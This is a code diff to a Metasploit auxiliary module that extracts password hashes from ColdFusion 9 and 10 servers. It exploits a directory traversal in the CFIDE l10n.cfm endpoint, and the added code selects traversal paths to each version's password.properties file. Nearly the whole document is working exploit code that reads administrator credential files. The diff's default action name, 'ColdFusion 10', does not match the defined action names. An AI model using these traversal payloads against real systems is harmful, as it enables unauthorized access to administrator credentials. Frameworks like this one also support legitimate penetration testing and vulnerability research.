@@ -14,14 +14,17 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => "ColdFusion 10 'password.properties' Hash Extraction",
+			'Name'           => "ColdFusion 'password.properties' Hash Extraction",
 			'Description'    => %q{
 					This module uses a directory traversal vulnerability to extract information
-				such as password, rdspassword, and "encrypted" properties.
+				such as password, rdspassword, and "encrypted" properties. This module has been
+				tested successfully on ColdFusion 9 and ColdFusion 10. Use actions to select the
+				target ColdFusion version.
 			},
 			'References'     =>
 				[
-					[ 'EDB', '25305' ],
+					[ 'OSVDB', '93114' ],
+					[ 'EDB', '25305' ]
 				],
 			'Author'         =>
 				[
@@ -29,11 +32,18 @@ class Metasploit3 < Msf::Auxiliary
 					'sinn3r'
 				],
 			'License'        => MSF_LICENSE,
+			'Actions'     =>
+				[
+					['ColdFusion10'],
+					['ColdFusion9']
+				],
+			'DefaultAction' => 'ColdFusion 10',
 			'DisclosureDate' => "May 7 2013"  #The day we saw the subzero poc
 		))
 
 		register_options(
 			[
+				Opt::RPORT(8500),
 				OptString.new("TARGETURI", [true, 'Base path to ColdFusion', '/'])
 			], self.class)
 	end
@@ -43,6 +53,14 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run
+		filename = ""
+		case action.name
+			when 'ColdFusion10'
+				filename = "../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties"
+			when 'ColdFusion9'
+				filename = "../../../../../../../../../../../../../../../opt/coldfusion9/lib/password.properties"
+		end
+
 		res = send_request_cgi({
 			'method'   => 'GET',
 			'uri'      => normalize_uri(target_uri.path, 'CFIDE', 'adminapi', 'customtags', 'l10n.cfm'),
@@ -51,7 +69,7 @@ class Metasploit3 < Msf::Auxiliary
 			'vars_get' => {
 				'attributes.id'            => 'it',
 				'attributes.file'          => '../../administrator/mail/download.cfm',
-				'filename'                 => '../../../../../../../../../opt/coldfusion10/cfusion/lib/password.properties',
+				'filename'                 => filename,
 				'attributes.locale'        => 'it',
 				'attributes.var'           => 'it',
 				'attributes.jscript'       => 'false',
